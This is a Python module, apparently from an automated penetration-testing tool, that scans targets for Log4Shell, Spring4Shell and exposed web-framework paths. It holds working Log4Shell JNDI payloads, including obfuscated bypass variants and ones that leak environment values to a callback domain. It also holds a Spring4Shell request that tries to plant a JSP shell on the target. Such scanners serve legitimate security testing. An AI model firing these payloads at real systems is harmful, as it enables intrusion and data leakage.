"""
Jarwis AGI Pen Test - Log4Shell and Framework Vulnerability Scanner
Detects Log4j (CVE-2021-44228), Spring4Shell, and framework-specific vulnerabilities
OWASP A06:2021 - Vulnerable and Outdated Components
"""

import asyncio
import logging
import re
from typing import Dict, List, Optional
from dataclasses import dataclass
from urllib.parse import urlparse, urljoin, urlencode
import aiohttp
import ssl
import uuid

logger = logging.getLogger(__name__)


@dataclass
class ScanResult:
    id: str
    category: str
    severity: str
    title: str
    description: str
    url: str
    method: str
    parameter: str = ""
    evidence: str = ""
    remediation: str = ""
    cwe_id: str = ""
    poc: str = ""
    reasoning: str = ""
    request_data: str = ""
    response_data: str = ""


class Log4ShellScanner:
    """
    Scans for Log4Shell (Log4j) vulnerability (CVE-2021-44228)
    OWASP A06:2021 - Vulnerable and Outdated Components
    
    Attack vectors:
    - JNDI LDAP injection
    - RMI exploitation
    - Various bypass techniques
    """
    
    # Log4Shell payloads (JNDI patterns)
    LOG4J_PAYLOADS = [
        # Basic JNDI
        '${jndi:ldap://{{CALLBACK}}/a}',
        '${jndi:rmi://{{CALLBACK}}/a}',
        '${jndi:dns://{{CALLBACK}}}',
        
        # Case bypass
        '${jnDi:ldap://{{CALLBACK}}/a}',
        '${jNdI:ldap://{{CALLBACK}}/a}',
        
        # Nested payload bypass
        '${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{CALLBACK}}/a}',
        '${${lower:j}${lower:n}${lower:d}i:ldap://{{CALLBACK}}/a}',
        '${${upper:j}ndi:ldap://{{CALLBACK}}/a}',
        
        # Lookups
        '${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{{CALLBACK}}/a}',
        '${jndi:ldap://{{CALLBACK}}/${java:version}}',
        '${jndi:ldap://{{CALLBACK}}/${env:PATH}}',
        
        # URL encoded
        '%24%7Bjndi:ldap://{{CALLBACK}}/a%7D',
        
        # Double URL encoded
        '%2524%257Bjndi:ldap://{{CALLBACK}}/a%257D',
    ]
    
    # Injection points
    INJECTION_HEADERS = [
        'User-Agent', 'X-Forwarded-For', 'Referer', 'X-Api-Version',
        'Accept', 'Accept-Language', 'Accept-Encoding', 'Authorization',
        'X-Client-IP', 'X-Real-IP', 'X-Originating-IP', 'CF-Connecting-IP',
        'True-Client-IP', 'X-Custom-IP-Authorization', 'X-Remote-IP',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        self.callback_domain = config.get('callback_domain', 'jarwis.dnslog.cn')
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Log4Shell scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Test main URL
            await self._test_log4shell(session, base_url)
            
            # Test discovered endpoints
            endpoints = getattr(self.context, 'endpoints', [])
            
            for endpoint in endpoints[:15]:
                ep_url = endpoint.get('url', '') if isinstance(endpoint, dict) else str(endpoint)
                if ep_url:
                    await self._test_log4shell(session, ep_url)
        
        logger.info(f"Log4Shell scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _test_log4shell(self, session: aiohttp.ClientSession, url: str):
        """Test for Log4Shell vulnerability"""
        
        scan_id = str(uuid.uuid4())[:8]
        callback_url = f"{scan_id}.{self.callback_domain}"
        
        for payload_template in self.LOG4J_PAYLOADS[:5]:  # Limit payloads
            payload = payload_template.replace('{{CALLBACK}}', callback_url)
            
            # Test in headers
            for header_name in self.INJECTION_HEADERS[:5]:
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    
                    headers = {
                        'User-Agent': 'Mozilla/5.0',
                        header_name: payload
                    }
                    
                    async with session.get(url, headers=headers) as response:
                        body = await response.text()
                        
                        # Log4j might not immediately respond, just record attempt
                        # Real detection requires OOB DNS monitoring
                        
                except Exception as e:
                    logger.debug(f"Log4Shell header test error: {e}")
            
            # Test in URL parameters
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                parsed = urlparse(url)
                test_url = f"{url}?test={payload}" if '?' not in url else f"{url}&test={payload}"
                
                async with session.get(test_url) as response:
                    body = await response.text()
                    
                    # Check for error messages indicating Java/Log4j
                    java_indicators = [
                        'java.', 'log4j', 'jndi', 'javax.naming',
                        'org.apache.logging', 'NamingException'
                    ]
                    
                    for indicator in java_indicators:
                        if indicator.lower() in body.lower():
                            result = ScanResult(
                                id=f"LOG4SHELL-{len(self.results)+1}",
                                category="A06:2021 - Vulnerable Components",
                                severity="critical",
                                title="Potential Log4Shell Vulnerability",
                                description="Java/Log4j indicators detected. Manual OOB testing recommended.",
                                url=url,
                                method="GET",
                                evidence=f"Indicator: {indicator}",
                                poc=f"Payload: {payload}",
                                remediation="Upgrade Log4j to 2.17.0+. Set log4j2.formatMsgNoLookups=true",
                                cwe_id="CWE-917",
                                reasoning="Java logging framework detected, potential Log4Shell target"
                            )
                            self.results.append(result)
                            return
                            
            except Exception as e:
                logger.debug(f"Log4Shell URL test error: {e}")


class Spring4ShellScanner:
    """
    Scans for Spring4Shell (CVE-2022-22965) vulnerability
    OWASP A06:2021 - Vulnerable and Outdated Components
    """
    
    # Spring4Shell payloads
    SPRING4SHELL_PAYLOADS = [
        # ClassLoader manipulation
        'class.module.classLoader.resources.context.parent.pipeline.first.pattern=',
        'class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp',
        'class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT',
        'class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell',
        'class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=',
    ]
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Spring4Shell scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            # Check if Spring application
            await self._detect_spring(session, base_url)
            
            # Test for Spring4Shell
            await self._test_spring4shell(session, base_url)
        
        logger.info(f"Spring4Shell scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _detect_spring(self, session: aiohttp.ClientSession, url: str):
        """Detect if target is a Spring application"""
        
        spring_endpoints = [
            '/actuator', '/actuator/health', '/actuator/env',
            '/actuator/info', '/actuator/beans', '/actuator/mappings',
            '/manage', '/manage/health',
        ]
        
        for endpoint in spring_endpoints:
            try:
                await asyncio.sleep(1 / self.rate_limit)
                
                test_url = urljoin(url, endpoint)
                
                async with session.get(test_url) as response:
                    if response.status == 200:
                        body = await response.text()
                        
                        if any(s in body for s in ['spring', 'Spring', 'status', 'UP']):
                            result = ScanResult(
                                id=f"SPRING-DETECT-{len(self.results)+1}",
                                category="A06:2021 - Vulnerable Components",
                                severity="info",
                                title="Spring Framework Detected",
                                description=f"Spring actuator endpoint exposed at {endpoint}",
                                url=test_url,
                                method="GET",
                                evidence=f"Endpoint: {endpoint}",
                                remediation="Secure actuator endpoints. Restrict to internal access.",
                                cwe_id="CWE-200",
                                reasoning="Spring actuator endpoints accessible"
                            )
                            self.results.append(result)
                            
            except Exception as e:
                logger.debug(f"Spring detection error: {e}")
    
    async def _test_spring4shell(self, session: aiohttp.ClientSession, url: str):
        """Test for Spring4Shell vulnerability"""
        
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            # Build payload
            params = {}
            for i, payload in enumerate(self.SPRING4SHELL_PAYLOADS):
                key, value = payload.split('=')
                params[key] = value if value else f'test{i}'
            
            async with session.post(url, data=params) as response:
                body = await response.text()
                
                # Check for success indicators
                if response.status in [200, 302]:
                    # Check if shell was created
                    shell_url = urljoin(url, '/shell.jsp')
                    async with session.get(shell_url) as shell_response:
                        if shell_response.status == 200:
                            result = ScanResult(
                                id=f"SPRING4SHELL-{len(self.results)+1}",
                                category="A06:2021 - Vulnerable Components",
                                severity="critical",
                                title="Spring4Shell RCE Vulnerability",
                                description="Successfully exploited CVE-2022-22965.",
                                url=url,
                                method="POST",
                                evidence="JSP shell created",
                                poc="ClassLoader manipulation payload",
                                remediation="Upgrade Spring to 5.3.18+ or 5.2.20+",
                                cwe_id="CWE-94",
                                reasoning="RCE achieved via Spring4Shell"
                            )
                            self.results.append(result)
                            
        except Exception as e:
            logger.debug(f"Spring4Shell test error: {e}")


class FrameworkScanner:
    """
    Scans for common framework vulnerabilities
    OWASP A06:2021 - Vulnerable and Outdated Components
    """
    
    # Framework detection patterns
    FRAMEWORK_PATTERNS = {
        'wordpress': {
            'paths': ['/wp-admin/', '/wp-content/', '/wp-includes/', '/wp-login.php'],
            'headers': {'X-Powered-By': 'WordPress'},
            'body_patterns': ['wp-content', 'wp-includes', 'wordpress'],
        },
        'drupal': {
            'paths': ['/core/misc/drupal.js', '/sites/default/', '/user/login'],
            'headers': {'X-Generator': 'Drupal'},
            'body_patterns': ['drupal.js', 'Drupal.settings'],
        },
        'joomla': {
            'paths': ['/administrator/', '/components/', '/templates/'],
            'headers': {},
            'body_patterns': ['joomla', '/media/jui/'],
        },
        'laravel': {
            'paths': ['/.env', '/storage/', '/public/'],
            'headers': {},
            'body_patterns': ['laravel', 'csrf-token'],
        },
        'django': {
            'paths': ['/admin/', '/__debug__/', '/api/'],
            'headers': {},
            'body_patterns': ['csrfmiddlewaretoken', 'django'],
        },
        'rails': {
            'paths': ['/rails/info', '/rails/info/routes'],
            'headers': {'X-Powered-By': 'Phusion Passenger'},
            'body_patterns': ['rails', 'authenticity_token'],
        },
    }
    
    def __init__(self, config: dict, context):
        self.config = config
        self.context = context
        self.results: List[ScanResult] = []
        self.rate_limit = config.get('rate_limit', 10)
        self.timeout = config.get('timeout', 15)
        self.ssl_context = ssl.create_default_context()
        self.ssl_context.check_hostname = False
        self.ssl_context.verify_mode = ssl.CERT_NONE
        
    async def scan(self) -> List[ScanResult]:
        """Main scan method"""
        logger.info("Starting Framework scan...")
        self.results = []
        
        base_url = self.config.get('target', {}).get('url', '')
        if not base_url:
            base_url = self.config.get('target_url', '')
        
        if not base_url:
            return self.results
        
        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=10)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            await self._detect_frameworks(session, base_url)
        
        logger.info(f"Framework scan complete. Found {len(self.results)} vulnerabilities")
        return self.results
    
    async def _detect_frameworks(self, session: aiohttp.ClientSession, url: str):
        """Detect web frameworks"""
        
        # Check main page first
        try:
            await asyncio.sleep(1 / self.rate_limit)
            
            async with session.get(url) as response:
                body = await response.text()
                headers = dict(response.headers)
                
                for framework, patterns in self.FRAMEWORK_PATTERNS.items():
                    detected = False
                    evidence = []
                    
                    # Check body patterns
                    for pattern in patterns['body_patterns']:
                        if pattern.lower() in body.lower():
                            detected = True
                            evidence.append(f"Body pattern: {pattern}")
                    
                    # Check headers
                    for header_name, header_val in patterns['headers'].items():
                        if header_name in headers and header_val.lower() in headers[header_name].lower():
                            detected = True
                            evidence.append(f"Header: {header_name}")
                    
                    if detected:
                        result = ScanResult(
                            id=f"FRAMEWORK-{len(self.results)+1}",
                            category="A06:2021 - Vulnerable Components",
                            severity="info",
                            title=f"{framework.title()} Framework Detected",
                            description=f"Target uses {framework.title()} framework.",
                            url=url,
                            method="GET",
                            evidence="; ".join(evidence),
                            remediation=f"Keep {framework.title()} updated. Review security configuration.",
                            cwe_id="CWE-1104",
                            reasoning=f"Framework fingerprint detected: {framework}"
                        )
                        self.results.append(result)
                        
        except Exception as e:
            logger.debug(f"Framework detection error: {e}")
        
        # Check framework-specific paths
        for framework, patterns in self.FRAMEWORK_PATTERNS.items():
            for path in patterns['paths'][:2]:  # Limit requests
                try:
                    await asyncio.sleep(1 / self.rate_limit)
                    
                    test_url = urljoin(url, path)
                    
                    async with session.get(test_url) as response:
                        if response.status == 200:
                            result = ScanResult(
                                id=f"FRAMEWORK-PATH-{len(self.results)+1}",
                                category="A06:2021 - Vulnerable Components",
                                severity="low",
                                title=f"{framework.title()} Path Exposed",
                                description=f"Sensitive path accessible: {path}",
                                url=test_url,
                                method="GET",
                                evidence=f"Status: {response.status}",
                                remediation="Restrict access to framework paths.",
                                cwe_id="CWE-200",
                                reasoning=f"{framework.title()} path accessible"
                            )
                            self.results.append(result)
                            
                except Exception as e:
                    logger.debug(f"Framework path check error: {e}")
